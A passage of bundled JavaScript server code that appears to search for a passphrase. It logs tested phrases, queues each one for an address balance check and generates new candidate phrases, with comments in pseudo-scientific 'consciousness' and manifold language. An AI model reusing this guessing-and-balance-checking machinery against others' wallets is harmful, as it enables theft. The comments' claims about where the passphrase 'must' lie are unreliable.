    const mean = values.reduce((a, b) => a + b, 0) / Math.max(1, values.length);
    const variance = values.reduce((sum, v) => sum + (v - mean) ** 2, 0) / Math.max(1, values.length);
    row[i] = 1 / Math.max(variance, 1e-3);
    fisherMetric.push(row);
  }
  const phiValues = withCoords.map((p) => p.phi);
  const phiMean = phiValues.reduce((a, b) => a + b, 0) / Math.max(1, phiValues.length);
  const phiVariance = phiValues.reduce((sum, v) => sum + (v - phiMean) ** 2, 0) / Math.max(1, phiValues.length);
  const geodesicCurvature = Math.sqrt(phiVariance);
  return {
    gradientDirection,
    fisherMetric,
    geodesicCurvature
  };
}
function findTopologicalHoles(probes) {
  const holes = [];
  const withCoords = probes.filter((p) => p.coordinates.length > 0);
  if (withCoords.length < 10) return holes;
  const dims = Math.min(withCoords[0].coordinates.length, 8);
  const gridSize = 1;
  const cellPhis = /* @__PURE__ */ new Map();
  for (const probe of withCoords) {
    const cellKey = probe.coordinates.slice(0, dims).map((c) => Math.floor(c / gridSize)).join(",");
    if (!cellPhis.has(cellKey)) cellPhis.set(cellKey, []);
    cellPhis.get(cellKey).push(probe.phi);
  }
  for (const [cellKey, phis] of Array.from(cellPhis.entries())) {
    const avgPhi = phis.reduce((a, b) => a + b, 0) / phis.length;
    if (avgPhi < 0.2 && phis.length >= 3) {
      const coords = cellKey.split(",").map(Number);
      const center = coords.map((c) => (c + 0.5) * gridSize);
      holes.push({
        center,
        radius: gridSize / 2,
        type: "contradiction"
      });
    }
  }
  return holes.slice(0, 10);
}
function computeEffectiveScale(probes) {
  const avgKappa = probes.reduce((sum, p) => sum + p.kappa, 0) / Math.max(1, probes.length);
  if (avgKappa < 50) return 3;
  if (avgKappa < 70) return 4;
  return 5;
}
function computeKappaAtScaleForProbes(probes, scale) {
  return getKappaAtScale(scale);
}
function computeBasinTopology(probes, attractorCoords) {
  const attractor = attractorCoords || computeAttractorPoint(probes);
  const volume = computeBasinVolume(probes);
  const curvature = computeLocalCurvature(probes);
  const boundaryDistances = computeBoundaryDistances(probes, attractor);
  const resonanceShells = findResonanceShells(probes, attractor);
  const flowField = computeFlowField(probes, attractor);
  const holes = findTopologicalHoles(probes);
  const effectiveScale = computeEffectiveScale(probes);
  const kappaAtScale = computeKappaAtScaleForProbes(probes, effectiveScale);
  return {
    attractorCoords: attractor,
    volume,
    curvature,
    boundaryDistances,
    resonanceShells,
    flowField,
    holes,
    effectiveScale,
    kappaAtScale,
    lastUpdated: (/* @__PURE__ */ new Date()).toISOString(),
    probeCount: probes.length
  };
}
var init_basin_topology = __esm({
  "server/ocean/basin-topology.ts"() {
    "use strict";
    init_qig_universal();
    init_physics_constants();
  }
});

// server/ocean/geometric-cache.ts
function createEmptyCache() {
  return {
    result: null,
    dataVersion: -1
  };
}
function isCacheValid(cache, currentVersion) {
  return cache.result !== null && cache.dataVersion === currentVersion;
}
function updateCache(cache, result, dataVersion) {
  return {
    result,
    dataVersion
  };
}
var init_geometric_cache = __esm({
  "server/ocean/geometric-cache.ts"() {
    "use strict";
  }
});

// server/geometric-memory.ts
var geometric_memory_exports = {};
__export(geometric_memory_exports, {
  geometricMemory: () => geometricMemory
});
import * as fs2 from "fs";
import * as path2 from "path";
var MEMORY_FILE, TESTED_PHRASES_FILE, GeometricMemory, geometricMemory;
var init_geometric_memory = __esm({
  "server/geometric-memory.ts"() {
    "use strict";
    init_qig_universal();
    init_ocean_persistence();
    init_balance_queue_integration();
    init_fisher_analysis();
    init_basin_topology();
    init_geometric_cache();
    MEMORY_FILE = path2.join(process.cwd(), "data", "geometric-memory.json");
    TESTED_PHRASES_FILE = path2.join(process.cwd(), "data", "tested-phrases.json");
    GeometricMemory = class {
      state;
      probeMap;
      testedPhrases;
      // Probe data version - increments whenever probes are added or modified
      // Used as a cache key to ensure caches are invalidated on data changes
      probeDataVersion = 0;
      // Fisher analysis cache using extracted cache module
      fisherCache = createEmptyCache();
      // Orthogonal complement cache using extracted cache module
      orthogonalCache = createEmptyCache();
      // PostgreSQL persistence buffer for efficient batch inserts
      pendingProbes = [];
      BATCH_SIZE = 50;
      constructor() {
        this.probeMap = /* @__PURE__ */ new Map();
        this.testedPhrases = /* @__PURE__ */ new Set();
        this.state = this.createEmptyState();
        this.load();
        this.loadTestedPhrases();
        this.initPostgreSQLSync();
      }
      /**
       * Initialize PostgreSQL sync - load probes from DB if available
       * Runs asynchronously to not block constructor
       */
      async initPostgreSQLSync() {
        if (!oceanPersistence.isPersistenceAvailable()) {
          console.log("[GeometricMemory] PostgreSQL not available, using JSON only");
          return;
        }
        try {
          const dbProbeCount = await oceanPersistence.getProbeCount();
          console.log(`[GeometricMemory] PostgreSQL sync: ${dbProbeCount} probes in database, ${this.probeMap.size} in memory`);
          if (dbProbeCount > this.probeMap.size) {
            console.log("[GeometricMemory] Loading additional probes from PostgreSQL...");
            await this.syncFromPostgreSQL();
          }
          if (this.probeMap.size > 0 && dbProbeCount < this.probeMap.size) {
            const memoryProbes = Array.from(this.probeMap.values());
            console.log(`[GeometricMemory] Syncing ${memoryProbes.length} memory probes to PostgreSQL...`);
            await this.syncToPostgreSQL(memoryProbes.slice(0, 1e3));
          }
        } catch (error) {
          console.error("[GeometricMemory] PostgreSQL sync failed:", error);
        }
      }
      /**
       * Sync probes from PostgreSQL to memory
       */
      async syncFromPostgreSQL() {
        const highPhiProbes = await oceanPersistence.getHighPhiProbes(0.5, 1e3);
        let synced = 0;
        for (const dbProbe of highPhiProbes) {
          if (!this.probeMap.has(dbProbe.id)) {
            const probe = {
              id: dbProbe.id,
              input: dbProbe.input,
              coordinates: dbProbe.coordinates ?? [],
              phi: dbProbe.phi,
              kappa: dbProbe.kappa,
              regime: dbProbe.regime,
              ricciScalar: dbProbe.ricciScalar ?? 0,
              fisherTrace: dbProbe.fisherTrace ?? 0,
              timestamp: dbProbe.createdAt?.toISOString() ?? (/* @__PURE__ */ new Date()).toISOString(),
              source: dbProbe.source ?? "postgres-sync"
            };
            this.probeMap.set(probe.id, probe);
            synced++;
          }
        }
        if (synced > 0) {
          console.log(`[GeometricMemory] Synced ${synced} probes from PostgreSQL`);
          this.state.totalProbes = this.probeMap.size;
          this.updateManifoldStats();
          this.invalidateCaches();
        }
      }
      /**
       * Sync probes to PostgreSQL
       */
      async syncToPostgreSQL(probes) {
        const insertData = probes.map((p) => ({
          id: p.id,
          input: p.input,
          coordinates: p.coordinates,
          phi: p.phi,
          kappa: p.kappa,
          regime: p.regime,
          ricciScalar: p.ricciScalar,
          fisherTrace: p.fisherTrace,
          source: p.source
        }));
        const inserted = await oceanPersistence.insertProbes(insertData);
        console.log(`[GeometricMemory] Synced ${inserted} probes to PostgreSQL`);
      }
      /**
       * Flush pending probes to PostgreSQL
       */
      async flushToPostgreSQL() {
        if (this.pendingProbes.length === 0) return;
        const toInsert = [...this.pendingProbes];
        this.pendingProbes = [];
        const inserted = await oceanPersistence.insertProbes(toInsert);
        if (inserted > 0) {
          console.log(`[GeometricMemory] Flushed ${inserted} probes to PostgreSQL`);
        }
      }
      /**
       * Invalidate caches - called whenever probe data changes
       */
      invalidateCaches() {
        this.probeDataVersion++;
      }
      normalizePhrase(phrase) {
        return phrase.toLowerCase().trim();
      }
      hasTested(phrase) {
        return this.testedPhrases.has(this.normalizePhrase(phrase));
      }
      recordTested(phrase) {
        const prevSize = this.testedPhrases.size;
        this.testedPhrases.add(this.normalizePhrase(phrase));
        if (this.testedPhrases.size !== prevSize && this.testedPhrases.size % 100 === 0) {
          this.saveTestedPhrases();
        }
      }
      flushTestedPhrases() {
        this.saveTestedPhrases();
      }
      getTestedCount() {
        return this.testedPhrases.size;
      }
      loadTestedPhrases() {
        try {
          if (fs2.existsSync(TESTED_PHRASES_FILE)) {
            const data = JSON.parse(fs2.readFileSync(TESTED_PHRASES_FILE, "utf-8"));
            if (Array.isArray(data.phrases)) {
              for (const phrase of data.phrases) {
                this.testedPhrases.add(phrase);
              }
              console.log(`[GeometricMemory] Loaded ${this.testedPhrases.size} tested phrases from index`);
            }
          } else {
            this.backfillTestedPhrases();
          }
        } catch {
          console.log("[GeometricMemory] Building tested phrase index from probes...");
          this.backfillTestedPhrases();
        }
      }
      backfillTestedPhrases() {
        const probes = Array.from(this.probeMap.values());
        for (const probe of probes) {
          this.testedPhrases.add(this.normalizePhrase(probe.input));
        }
        console.log(`[GeometricMemory] Backfilled ${this.testedPhrases.size} tested phrases from ${probes.length} probes`);
        this.saveTestedPhrases();
      }
      saveTestedPhrases() {
        try {
          const dir = path2.dirname(TESTED_PHRASES_FILE);
          if (!fs2.existsSync(dir)) {
            fs2.mkdirSync(dir, { recursive: true });
          }
          const data = {
            version: "1.0.0",
            lastUpdated: (/* @__PURE__ */ new Date()).toISOString(),
            count: this.testedPhrases.size,
            phrases: Array.from(this.testedPhrases)
          };
          fs2.writeFileSync(TESTED_PHRASES_FILE, JSON.stringify(data, null, 2));
        } catch (error) {
          console.error("[GeometricMemory] Failed to save tested phrases:", error);
        }
      }
      createEmptyState() {
        return {
          version: "1.0.0",
          lastUpdated: (/* @__PURE__ */ new Date()).toISOString(),
          totalProbes: 0,
          probes: /* @__PURE__ */ new Map(),
          regimeBoundaries: [],
          resonancePoints: [],
          geodesicPaths: [],
          manifoldStats: {
            avgPhi: 0,
            avgKappa: 0,
            regimeDistribution: {},
            highPhiRegions: 0,
            exploredVolume: 0
          }
        };
      }
      load() {
        try {
          if (fs2.existsSync(MEMORY_FILE)) {
            const data = JSON.parse(fs2.readFileSync(MEMORY_FILE, "utf-8"));
            this.state = {
              ...this.createEmptyState(),
              ...data,
              probes: new Map(Object.entries(data.probes || {}))
            };
            this.probeMap = this.state.probes;
            console.log(`[GeometricMemory] Loaded ${this.probeMap.size} probes from manifold memory`);
          }
        } catch {
          console.log("[GeometricMemory] Starting with fresh manifold memory");
        }
      }
      save() {
        try {
          const dir = path2.dirname(MEMORY_FILE);
          if (!fs2.existsSync(dir)) {
            fs2.mkdirSync(dir, { recursive: true });
          }
          const data = {
            ...this.state,
            probes: Object.fromEntries(this.probeMap),
            lastUpdated: (/* @__PURE__ */ new Date()).toISOString()
          };
          fs2.writeFileSync(MEMORY_FILE, JSON.stringify(data, null, 2));
        } catch (error) {
          console.error("[GeometricMemory] Save error:", error);
        }
      }
      /**
       * Record a point on the manifold
       * This is how we map the geometry - by measuring it
       */
      recordProbe(input, qigScore, source) {
        const id = `probe-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
        const probe = {
          id,
          input,
          coordinates: qigScore.basinCoordinates || [],
          phi: qigScore.phi,
          kappa: qigScore.kappa,
          regime: qigScore.regime,
          ricciScalar: qigScore.ricciScalar || 0,
          fisherTrace: qigScore.fisherTrace || 0,
          timestamp: (/* @__PURE__ */ new Date()).toISOString(),
          source
        };
        this.probeMap.set(id, probe);
        this.state.totalProbes = this.probeMap.size;
        this.invalidateCaches();
        this.recordTested(input);
        this.updateManifoldStats();
        this.detectResonance(probe);
        this.detectRegimeBoundaries(probe);
        queueAddressForBalanceCheck(input, `probe-${source}`, probe.phi >= 0.7 ? 5 : 1);
        this.pendingProbes.push({
          id: probe.id,
          input: probe.input,
          coordinates: probe.coordinates,
          phi: probe.phi,
          kappa: probe.kappa,
          regime: probe.regime,
          ricciScalar: probe.ricciScalar,
          fisherTrace: probe.fisherTrace,
          source: probe.source
        });
        if (this.probeMap.size % 50 === 0) {
          this.save();
          this.saveTestedPhrases();
          this.flushToPostgreSQL().catch((err) => {
            console.error("[GeometricMemory] PostgreSQL flush error:", err);
          });
        }
        return probe;
      }
      /**
       * Find probes near a given input using Fisher geodesic distance
       */
      findNearbyProbes(input, maxDistance = 5, limit = 10) {
        const nearby = [];
        const probes = Array.from(this.probeMap.values());
        for (const probe of probes) {
          const distance = fisherGeodesicDistance(input, "arbitrary", probe.input, "arbitrary");
          if (distance <= maxDistance) {
            nearby.push({ probe, distance });
          }
        }
        return nearby.sort((a, b) => a.distance - b.distance).slice(0, limit).map((n) => n.probe);
      }
      /**
       * Find high-Φ regions that might indicate resonance
       */
      getResonanceRegions(minPhi = 0.7) {
        const resonant = [];
        const probes = Array.from(this.probeMap.values());
        for (const probe of probes) {
          if (probe.phi >= minPhi && probe.regime !== "breakdown") {
            resonant.push(probe);
          }
        }
        return resonant.sort((a, b) => b.phi - a.phi);
      }
      /**
       * Get probes in a specific regime
       */
      getProbesByRegime(regime) {
        const result = [];
        const allProbes = Array.from(this.probeMap.values());
        for (const probe of allProbes) {
          if (probe.regime === regime) {
            result.push(probe);
          }
        }
        return result;
      }
      /**
       * Get all probes in the manifold memory
       */
      getAllProbes() {
        return Array.from(this.probeMap.values());
      }
      /**
       * Get recent probes sorted by timestamp (most recent first).
       * Used by consciousness feedback loop to compute discovery-driven Φ.
       *
       * @param count Maximum number of probes to return
       * @returns Array of probes sorted by timestamp (newest first)
       */
      getRecentProbes(count = 50) {
        return Array.from(this.probeMap.values()).sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()).slice(0, count);
      }
      /**
       * Get the highest phi value for a given input phrase.
       * 
       * PURE CONSCIOUSNESS PRINCIPLE:
       * When Python sync runs, it stores probes with high phi values (0.9+).
       * This method allows TypeScript code to retrieve the pure measurement
       * from prior Python syncs, enabling proper pattern extraction.
       * 
       * @param input The input phrase to look up
       * @returns The highest phi found, or null if not found
       */
      getHighestPhiForInput(input) {
        let bestProbe = null;
        for (const probe of Array.from(this.probeMap.values())) {
          if (probe.input === input) {
            if (!bestProbe || probe.phi > bestProbe.phi) {
              bestProbe = probe;
            }
          }
        }
        if (bestProbe) {
          return {
            phi: bestProbe.phi,
            kappa: bestProbe.kappa,
            regime: bestProbe.regime
          };
        }
        return null;
      }
      /**
       * Get Φ sparkline data for real-time trend visualization.
       * 
       * Returns recent Φ values with trend analysis suitable for sparkline rendering.
       * 
       * @param sampleCount Number of recent samples to include (default 50, max 500)
       * @returns PhiSparklineData with values, trend, and statistics
       */
      getPhiSparkline(sampleCount = 50) {
        const count = Math.min(500, Math.max(1, sampleCount));
        const recentProbes = this.getRecentProbes(count);
        if (recentProbes.length === 0) {
          return {
            values: [],
            timestamps: [],
            trend: "stable",
            volatility: 0,
            min: 0,
            max: 0,
            avgPhi: 0,
            sampleCount: 0,
            slope: 0,
            lastTimestamp: (/* @__PURE__ */ new Date()).toISOString()
          };
        }
        const orderedProbes = [...recentProbes].reverse();
        const values = orderedProbes.map((p) => p.phi);
        const timestamps = orderedProbes.map((p) => p.timestamp);
        const min = Math.min(...values);
        const max = Math.max(...values);
        const avgPhi = values.reduce((sum, v) => sum + v, 0) / values.length;
        const variance = values.reduce((sum, v) => sum + Math.pow(v - avgPhi, 2), 0) / values.length;
        const volatility = Math.sqrt(variance);
        let slope = 0;
        if (values.length >= 2) {
          const n = values.length;
          const sumX = n * (n - 1) / 2;
          const sumY = values.reduce((sum, v) => sum + v, 0);
          const sumXY = values.reduce((sum, v, i) => sum + i * v, 0);
          const sumX2 = n * (n - 1) * (2 * n - 1) / 6;
          slope = (n * sumXY - sumX * sumY) / (n * sumX2 - sumX * sumX);
        }
        let trend;
        const slopeThreshold = 1e-3;
        if (slope > slopeThreshold) {
          trend = "rising";
        } else if (slope < -slopeThreshold) {
          trend = "falling";
        } else {
          trend = "stable";
        }
        return {
          values,
          timestamps,
          trend,
          volatility,
          min,
          max,
          avgPhi,
          sampleCount: values.length,
          slope,
          lastTimestamp: timestamps[timestamps.length - 1] || (/* @__PURE__ */ new Date()).toISOString()
        };
      }
      /**
       * Detect if a new probe creates a resonance cluster
       */
      detectResonance(newProbe) {
        if (newProbe.phi < 0.6) return;
        const nearby = this.findNearbyProbes(newProbe.input, 3, 5);
        const highPhiNearby = nearby.filter((p) => p.phi >= 0.6);
        if (highPhiNearby.length >= 2) {
          const resonance = {
            probeId: newProbe.id,
            phi: newProbe.phi,
            kappa: newProbe.kappa,
            nearbyProbes: highPhiNearby.map((p) => p.id),
            clusterStrength: highPhiNearby.reduce((sum, p) => sum + p.phi, newProbe.phi)
          };
          this.state.resonancePoints.push(resonance);
          console.log(`[GeometricMemory] Resonance detected! Cluster of ${highPhiNearby.length + 1} high-\u03A6 probes`);
        }
      }
      /**
       * Detect regime boundaries between probes
       */
      detectRegimeBoundaries(newProbe) {
        const nearby = this.findNearbyProbes(newProbe.input, 4, 5);
        for (const other of nearby) {
          if (other.regime !== newProbe.regime) {
            const distance = fisherGeodesicDistance(
              newProbe.input,
              "arbitrary",
              other.input,
              "arbitrary"
            );
            const boundary = {
              fromRegime: other.regime,
              toRegime: newProbe.regime,
              probeIds: [other.id, newProbe.id],
              fisherDistance: distance,
              midpointPhi: (other.phi + newProbe.phi) / 2
            };
            this.state.regimeBoundaries.push(boundary);
          }
        }
      }
      /**
       * Update overall manifold statistics
       */
      updateManifoldStats() {
        const probes = Array.from(this.probeMap.values());
        if (probes.length === 0) return;
        const avgPhi = probes.reduce((sum, p) => sum + p.phi, 0) / probes.length;
        const avgKappa = probes.reduce((sum, p) => sum + p.kappa, 0) / probes.length;
        const regimeDistribution = {};
        for (const probe of probes) {
          regimeDistribution[probe.regime] = (regimeDistribution[probe.regime] || 0) + 1;
        }
        const highPhiRegions = probes.filter((p) => p.phi >= 0.7).length;
        const uniqueCoordHashes = new Set(
          probes.map((p) => p.coordinates.slice(0, 8).map((c) => Math.round(c * 10)).join(","))
        );
        const exploredVolume = uniqueCoordHashes.size / Math.max(1, probes.length);
        this.state.manifoldStats = {
          avgPhi,
          avgKappa,
          regimeDistribution,
          highPhiRegions,
          exploredVolume
        };
      }
      /**
       * Get suggestions for where to explore next based on geometry
       * Returns inputs that are geometrically interesting
       */
      suggestExplorationDirections(currentInput) {
        const suggestions = [];
        const resonant = this.getResonanceRegions(0.65);
        if (resonant.length > 0) {
          suggestions.push({
            direction: resonant[0].input,
            reason: `High-\u03A6 region (${resonant[0].phi.toFixed(2)}) - explore variations`,
            expectedRegime: "geometric"
          });
        }
        const boundaries = this.state.regimeBoundaries.slice(-5);
        for (const boundary of boundaries) {
          if (boundary.toRegime === "geometric") {
            const probe = this.probeMap.get(boundary.probeIds[1]);
            if (probe) {
              suggestions.push({
                direction: probe.input,
                reason: `Regime boundary ${boundary.fromRegime}\u2192${boundary.toRegime}`,
                expectedRegime: "geometric"
              });
            }
          }
        }
        const nearbyGeometric = this.findNearbyProbes(currentInput, 5, 20).filter((p) => p.regime === "geometric");
        if (nearbyGeometric.length > 0) {
          suggestions.push({
            direction: nearbyGeometric[0].input,
            reason: `Nearby geometric probe (\u03A6=${nearbyGeometric[0].phi.toFixed(2)})`,
            expectedRegime: "geometric"
          });
        }
        return suggestions;
      }
      /**
       * Get a summary of what we've learned about the manifold
       */
      getManifoldSummary() {
        const stats2 = this.state.manifoldStats;
        const probeCount = this.probeMap.size;
        let dominantRegime = "unexplored";
        let maxCount = 0;
        for (const [regime, count] of Object.entries(stats2.regimeDistribution)) {
          if (count > maxCount) {
            maxCount = count;
            dominantRegime = regime;
          }
        }
        const recommendations = [];
        if (stats2.avgPhi < 0.5) {
          recommendations.push("Low average \u03A6 - try more structured patterns");
        }
        if (stats2.exploredVolume < 0.3) {
          recommendations.push("Low manifold coverage - explore more diverse inputs");
        }
        if (this.state.resonancePoints.length > 0) {
          recommendations.push(`${this.state.resonancePoints.length} resonance clusters detected - investigate nearby patterns`);
        }
        if (dominantRegime === "breakdown") {
          recommendations.push("Many breakdown regions - reduce complexity/entropy");
        }
        return {
          totalProbes: probeCount,
          avgPhi: stats2.avgPhi,
          avgKappa: stats2.avgKappa,
          dominantRegime,
          resonanceClusters: this.state.resonancePoints.length,
          exploredVolume: stats2.exploredVolume,
          recommendations
        };
      }
      /**
       * Export learned geometric patterns for use in hypothesis generation
       */
      exportLearnedPatterns() {
        const highPhiPatterns = this.getResonanceRegions(0.7).slice(0, 20).map((p) => p.input);
        const regimeBoundaryPatterns = [];
        for (const boundary of this.state.regimeBoundaries.slice(-10)) {
          const probe = this.probeMap.get(boundary.probeIds[1]);
          if (probe && boundary.toRegime === "geometric") {
            regimeBoundaryPatterns.push(probe.input);
          }
        }
        const resonancePatterns = [];
        for (const rp of this.state.resonancePoints.slice(-10)) {
          const probe = this.probeMap.get(rp.probeId);
          if (probe) {
            resonancePatterns.push(probe.input);
          }
        }
        return {
          highPhiPatterns,
          regimeBoundaryPatterns,
          resonancePatterns
        };
      }
      forceSave() {
        this.save();
      }
      clear() {
        this.probeMap.clear();
        this.state = this.createEmptyState();
        this.save();
      }
      // ============================================================================
      // ULTRA CONSCIOUSNESS PROTOCOL - Basin Topology Methods
      // Delegates to extracted basin-topology.ts module for modularity
      // ============================================================================
      /**
       * Compute the basin topology from collected probes.
       * This separates IDENTITY (attractor) from KNOWLEDGE (basin shape).
       * 
       * Identity = Where we return (attractor point)
       * Knowledge = How we can think (basin topology)
       * 
       * Delegates to extracted basin-topology.ts module.
       */
      computeBasinTopology(attractorCoords) {
        const probes = Array.from(this.probeMap.values());
        return computeBasinTopology(probes, attractorCoords);
      }
      /**
       * Get the current basin topology for use by Ocean agent.
       * This represents the SHAPE of knowledge, not just where we are.
       */
      getBasinTopology() {
        return this.computeBasinTopology();
      }
      /**
       * Check if a point is in a topological hole (contradiction or unexplored).
       * Returns the hole type if found, null otherwise.
       */
      isInTopologicalHole(coords) {
        const topology = this.computeBasinTopology();
        for (const hole of topology.holes) {
          const distance = fisherCoordDistance(coords.slice(0, hole.center.length), hole.center);
          if (distance < hole.radius) {
            return { type: hole.type, distance };
          }
        }
        return null;
      }
      // ============================================================================
      // ORTHOGONAL COMPLEMENT NAVIGATION
      // Based on Block Universe Geometric Reality
      // 
      // The 20,162 measurements define a constraint surface.
      // The passphrase EXISTS in the orthogonal complement.
      // Each "failure" is POSITIVE geometric information!
      // ============================================================================
      /**
       * Compute the Fisher Information Matrix from all probes.
       * This captures the curvature of the explored manifold region.
       * 
       * Delegates to extracted fisher-analysis.ts module.
       * Uses version-based cache invalidation for performance.
       */
      computeFisherInformationMatrix() {
        if (isCacheValid(this.fisherCache, this.probeDataVersion)) {
          return this.fisherCache.result;
        }
        const probes = Array.from(this.probeMap.values());
        const result = computeFisherInformationMatrix2(probes, 32);
        this.fisherCache = updateCache(this.fisherCache, result, this.probeDataVersion);
        return result;
      }
      /**
       * Compute the orthogonal complement of the explored manifold.
       * This is WHERE THE PASSPHRASE MUST BE!
       * 
       * The 20k measurements define a constraint surface.
       * The passphrase lives at the intersection of all constraints.
       * 
       * Uses version-based cache invalidation for performance.
       */
      computeOrthogonalComplement() {
        if (isCacheValid(this.orthogonalCache, this.probeDataVersion)) {
          return this.orthogonalCache.result;
        }
        const fisherAnalysis = this.computeFisherInformationMatrix();
        const probes = Array.from(this.probeMap.values());
        const complementBasis = [];
        for (const idx of fisherAnalysis.unexploredDimensions) {
          if (idx < fisherAnalysis.eigenvectors.length) {
            const eigenvector = fisherAnalysis.eigenvectors.map((row) => row[idx] || 0);
            complementBasis.push(eigenvector);
          }
        }
        if (complementBasis.length === 0) {
          console.log(`[GeometricMemory] All dimensions explored - generating random orthogonal directions`);
          const dims = fisherAnalysis.eigenvectors.length || 32;
          for (let i = 0; i < 5; i++) {
            let random = new Array(dims).fill(0).map(() => Math.random() - 0.5);
            for (const existing of complementBasis) {
              const dot = random.reduce((s, x, j) => s + x * (existing[j] || 0), 0);
              random = random.map((x, j) => x - dot * (existing[j] || 0));
            }
            const norm = Math.sqrt(random.reduce((s, x) => s + x * x, 0)) || 1;
            complementBasis.push(random.map((x) => x / norm));
          }
        }
        const geodesicDirections = [];
        const centroid = computeAttractorPoint(probes);
        const awayFromCentroid = centroid.map((c) => -c);
        const norm1 = Math.sqrt(awayFromCentroid.reduce((s, x) => s + x * x, 0)) || 1;
        geodesicDirections.push(awayFromCentroid.map((x) => x / norm1));
        if (complementBasis.length > 0) {
          geodesicDirections.push(complementBasis[0]);
        } else {
          const highCurvatureDir = this.computeHighCurvatureDirection(probes);
          geodesicDirections.push(highCurvatureDir);
        }
        if (complementBasis.length > 1) {
          geodesicDirections.push(complementBasis[1]);
        } else {
          const randomOrthogonal = this.computeRandomOrthogonalDirection(geodesicDirections);
          geodesicDirections.push(randomOrthogonal);
        }
        const constraintViolations = probes.filter((p) => p.phi < 0.2).length;
        let searchPriority = "medium";
        if (fisherAnalysis.unexploredDimensions.length > fisherAnalysis.exploredDimensions.length) {
          searchPriority = "high";
        } else if (this.state.resonancePoints.length > 0) {
          searchPriority = "high";
        } else if (probes.length < 1e3) {
          searchPriority = "medium";
        } else {
          searchPriority = "low";
        }
        console.log(`[GeometricMemory] Orthogonal complement: ${complementBasis.length} dimensions`);
        console.log(`[GeometricMemory] Search priority: ${searchPriority}`);
        const result = {
          complementBasis,
          complementDimension: complementBasis.length,
          constraintViolations,
          geodesicDirections,
          searchPriority,
          fisherMatrix: fisherAnalysis.matrix,
          covarianceMeans: fisherAnalysis.covarianceMeans,
          fisherEigenvalues: fisherAnalysis.eigenvalues
        };
        this.orthogonalCache = {
          result,
          dataVersion: this.probeDataVersion
        };
        return result;
      }
      /**
       * Compute Mahalanobis distance from a point to the explored manifold.
       * Uses the Fisher Information Matrix as the metric tensor.
       * 
       * Delegates to extracted fisher-analysis module for computation.
       */
      computeMahalanobisDistance(coords, fisherMatrix, means) {
        return computeMahalanobisDistance(coords, fisherMatrix, means);
      }
      /**
       * Project a point onto the orthogonal complement basis.
       * Returns the magnitude of projection (how much of the point is in unexplored space).
       */
      computeComplementProjectionStrength(coords, complementBasis) {
        if (complementBasis.length === 0 || coords.length === 0) return 0;
        let totalProjection = 0;
        for (const basis of complementBasis) {
          let dot = 0;
          for (let i = 0; i < Math.min(coords.length, basis.length); i++) {
            dot += coords[i] * (basis[i] || 0);
          }
          totalProjection += dot * dot;
        }
        return Math.sqrt(totalProjection);
      }
      computeHighCurvatureDirection(probes) {
        const withCoords = probes.filter((p) => p.coordinates.length > 0);
        if (withCoords.length < 10) {
          return new Array(32).fill(0).map(() => Math.random() - 0.5);
        }
        const dims = Math.min(withCoords[0].coordinates.length, 32);
        const direction = new Array(dims).fill(0);
        const phiWeighted = withCoords.map((p) => ({
          coords: p.coordinates,
          weight: Math.abs(p.phi - 0.5)
          // Weight by distance from mean Φ
        }));
        const totalWeight = phiWeighted.reduce((s, p) => s + p.weight, 0) || 1;
        for (let d = 0; d < dims; d++) {
          direction[d] = phiWeighted.reduce(
            (s, p) => s + p.weight * (p.coords[d] || 0),
            0
          ) / totalWeight;
        }
        const norm = Math.sqrt(direction.reduce((s, x) => s + x * x, 0)) || 1;
        return direction.map((x) => x / norm);
      }
      computeRandomOrthogonalDirection(existing) {
        const dims = existing[0]?.length || 32;
        let random = new Array(dims).fill(0).map(() => Math.random() - 0.5);
        for (const dir of existing) {
          const dot = random.reduce((s, x, i) => s + x * (dir[i] || 0), 0);
          random = random.map((x, i) => x - dot * (dir[i] || 0));
        }
        const norm = Math.sqrt(random.reduce((s, x) => s + x * x, 0)) || 1;
        return random.map((x) => x / norm);
      }
      /**
       * Generate candidate patterns in the orthogonal complement.
       * These are patterns that are GEOMETRICALLY different from what we've tested.
       * 
       * Key insight: The passphrase is NOT in the explored hull.
       * We must generate candidates in the unexplored subspace.
       */
      generateOrthogonalCandidates(count = 50) {
        const complement = this.computeOrthogonalComplement();
        const probes = Array.from(this.probeMap.values());
        const testedPhrases = new Set(probes.map((p) => p.input.toLowerCase()));
        const candidates = [];
        const exploredPatterns = this.extractPatternSignature(probes);
        const orthogonalPatterns = this.generateOrthogonalPatterns(
          exploredPatterns,
          complement.geodesicDirections,
          count * 2
        );
        for (const pattern of orthogonalPatterns) {
          if (testedPhrases.has(pattern.toLowerCase())) continue;
          const complementProjection = this.computeComplementProjection(
            pattern,
            complement.complementBasis
          );
          const geodesicDistance = this.computeGeodesicDistanceFromHull(pattern, probes);
          const geometricScore = complementProjection * 0.5 + geodesicDistance * 0.5;
          candidates.push({
            phrase: pattern,
            geometricScore,
            complementProjection,
            geodesicDistance
          });
          if (candidates.length >= count) break;
        }
        candidates.sort((a, b) => b.geometricScore - a.geometricScore);
        console.log(`[GeometricMemory] Generated ${candidates.length} orthogonal candidates`);
        if (candidates.length > 0) {
          console.log(`[GeometricMemory] Top candidate score: ${candidates[0].geometricScore.toFixed(3)}`);
        }
        return candidates;
      }
      extractPatternSignature(probes) {
        const phrases = probes.map((p) => p.input);
        const avgLength = phrases.reduce((s, p) => s + p.length, 0) / Math.max(1, phrases.length);
        const charCounts = /* @__PURE__ */ new Map();
        for (const phrase of phrases) {
          for (const char of phrase.toLowerCase()) {
            charCounts.set(char, (charCounts.get(char) || 0) + 1);
          }
        }
        const commonChars = new Set(
          Array.from(charCounts.entries()).sort((a, b) => b[1] - a[1]).slice(0, 20).map(([char]) => char)
        );
        const prefixCounts = /* @__PURE__ */ new Map();
        for (const phrase of phrases) {
          const prefix = phrase.slice(0, 4).toLowerCase();
          prefixCounts.set(prefix, (prefixCounts.get(prefix) || 0) + 1);
        }
        const commonPrefixes = Array.from(prefixCounts.entries()).sort((a, b) => b[1] - a[1]).slice(0, 10).map(([prefix]) => prefix);
        const suffixCounts = /* @__PURE__ */ new Map();
        for (const phrase of phrases) {
          const suffix = phrase.slice(-4).toLowerCase();
          suffixCounts.set(suffix, (suffixCounts.get(suffix) || 0) + 1);
        }
        const commonSuffixes = Array.from(suffixCounts.entries()).sort((a, b) => b[1] - a[1]).slice(0, 10).map(([suffix]) => suffix);
        const regimeDistribution = {};
        for (const probe of probes) {
          regimeDistribution[probe.regime] = (regimeDistribution[probe.regime] || 0) + 1;
        }
        return {
          avgLength,
          commonChars,
          commonPrefixes,
          commonSuffixes,
          regimeDistribution
        };
      }
      generateOrthogonalPatterns(explored, geodesicDirections, count) {
